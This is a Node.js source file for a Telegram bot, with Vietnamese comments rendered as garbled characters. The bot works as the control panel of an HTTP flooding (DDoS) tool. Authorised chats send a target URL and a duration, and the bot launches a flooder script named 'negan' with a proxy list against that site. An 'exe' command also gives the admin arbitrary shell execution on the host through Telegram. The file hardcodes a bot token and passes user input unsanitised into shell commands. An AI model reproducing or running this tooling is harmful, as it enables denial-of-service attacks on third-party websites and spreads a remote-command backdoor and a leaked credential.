const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// C·∫•u h√¨nh
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([
    -1002423723717, // Thay th·∫ø b·∫±ng group ID th·ª±c t·∫ø
    987654321, // Thay th·∫ø b·∫±ng group ID th·ª±c t·∫ø
    112233445, // Thay th·∫ø b·∫±ng group ID th·ª±c t·∫ø
    556677889, // Thay th·∫ø b·∫±ng group ID th·ª±c t·∫ø
    998877665  // Thay th·∫ø b·∫±ng group ID th·ª±c t·∫ø
]);
const maxConcurrentAttacks = 1; // M·ªói ng∆∞·ªùi d√πng ch·ªâ ƒë∆∞·ª£c ch·∫°y 1 l·ªánh c√πng l√∫c
const maxTimeAttacks = 120; // Th·ªùi gian t·ªëi ƒëa cho m·ªói l·ªánh (gi√¢y)

// Kh·ªüi t·∫°o bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = {}; // L∆∞u tr·ªØ ti·∫øn tr√¨nh c·ªßa t·ª´ng ng∆∞·ªùi d√πng

// Th√¥ng b√°o bot ƒë√£ s·∫µn s√†ng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] ü§ñ Bot ƒë√£ s·∫µn s√†ng nh·∫≠n l·ªánh.');
console.log('[DEBUG] Bot ƒë√£ kh·ªüi ƒë·ªông xong v√† s·∫µn s√†ng nh·∫≠n l·ªánh.');

// H√†m l·∫•y th√¥ng s·ªë h·ªá th·ªëng
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// G·ª≠i th√¥ng s·ªë h·ªá th·ªëng ƒë·ªãnh k·ª≥
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Th√¥ng s·ªë ƒë√£ s·ª≠ d·ª•ng: üöÄ\n- CPU ƒë√£ s·ª≠ d·ª•ng: ${stats.cpuUsagePercent}%\n- RAM ƒë√£ s·ª≠ d·ª•ng: ${stats.memoryUsagePercent}%\n\nTh√¥ng s·ªë c√≤n tr·ªëng: ‚ù§Ô∏è\n- CPU c√≤n tr·ªëng: ${cpuFreePercent}%\n- RAM c√≤n tr·ªëng: ${stats.freeMemory}GB\n- T·ªïng RAM: ${stats.totalMemory}GB`);
}, 14000);

// H√†m g·ª≠i k·∫øt qu·∫£ d∆∞·ªõi d·∫°ng Markdown
const sendMarkdownResult = async (chatId, command, output) => {
    const message = `üöÄ K·∫øt qu·∫£ l·ªánh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``;
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(`[ERROR] G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: ${error.message}`);
        await bot.sendMessage(chatId, `üö´ L·ªói khi g·ª≠i k·∫øt qu·∫£: ${error.message}`);
    }
};

// H√†m th·ª±c thi l·ªánh pkill
const executePkill = async (chatId, file) => {
    const getPidCommand = `pgrep -f ${file}`, pkillCommand = `pkill -f -9 ${file}`;
    exec(getPidCommand, (error, stdout, stderr) => {
        const pids = stdout.trim().split('\n').filter(pid => pid.length > 0);
        if (pids.length === 0) return bot.sendMessage(chatId, '‚ùå Kh√¥ng t√¨m th·∫•y ti·∫øn tr√¨nh ph√π h·ª£p.');
        exec(pkillCommand, (error) => {
            if (error) bot.sendMessage(chatId, `‚ùå L·ªói khi th·ª±c thi l·ªánh: ${error.message}`);
            else bot.sendMessage(chatId, `‚úÖ ƒê√£ d·ª´ng ti·∫øn tr√¨nh v·ªõi PID: ${pids.join(', ')}`);
        });
    });
};

// X·ª≠ l√Ω l·ªánh t·ª´ ng∆∞·ªùi d√πng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);

    // Ki·ªÉm tra quy·ªÅn th·ª±c thi l·ªánh
    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, 'B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán l·ªánh n√†y.');

    // X·ª≠ l√Ω l·ªánh t·∫•n c√¥ng (URL + th·ªùi gian)
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        // Ki·ªÉm tra xem ng∆∞·ªùi d√πng ƒëang c√≥ l·ªánh n√†o ch·∫°y kh√¥ng
        if (currentAttacks[chatId]) return bot.sendMessage(chatId, 'üö´ B·∫°n ƒëang c√≥ m·ªôt l·ªánh ch·∫°y. Vui l√≤ng ch·ªù ti·∫øn tr√¨nh hi·ªán t·∫°i ho√†n t·∫•t.');

        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai ƒë·ªãnh d·∫°ng! Nh·∫≠p theo: <URL> <time>.');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `üö´ Th·ªùi gian t·ªëi ƒëa l√† ${maxTimeAttacks} gi√¢y.`);

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks[chatId] = { pid: null, user: chatId }; // L∆∞u th√¥ng tin l·ªánh ƒëang ch·∫°y
        bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);

        const child = exec(command, { shell: '/bin/bash' });
        child.on('close', () => {
            delete currentAttacks[chatId]; // X√≥a th√¥ng tin l·ªánh ƒë√£ ho√†n t·∫•t
            bot.sendMessage(chatId, '‚úÖ Ti·∫øn tr√¨nh ho√†n t·∫•t.');
        });
        return;
    }

    // X·ª≠ l√Ω l·ªánh exe (ch·ªâ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, 'L·ªánh kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng. V√≠ d·ª•: "exe ls"');
        if (command.startsWith('pkill')) {
            const filesToKill = command.split(' ').slice(1);
            if (filesToKill.length === 0) return bot.sendMessage(chatId, '‚ùå L·ªánh pkill c·∫ßn c√≥ √≠t nh·∫•t m·ªôt t√™n file.');
            for (const file of filesToKill) await executePkill(chatId, file);
            return;
        }
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendMarkdownResult(chatId, command, output));
        return;
    }

    // L·ªánh kh√¥ng h·ª£p l·ªá
    bot.sendMessage(chatId, 'L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng b·∫Øt ƒë·∫ßu l·ªánh v·ªõi "exe" ho·∫∑c nh·∫≠p URL v√† th·ªùi gian.');
});
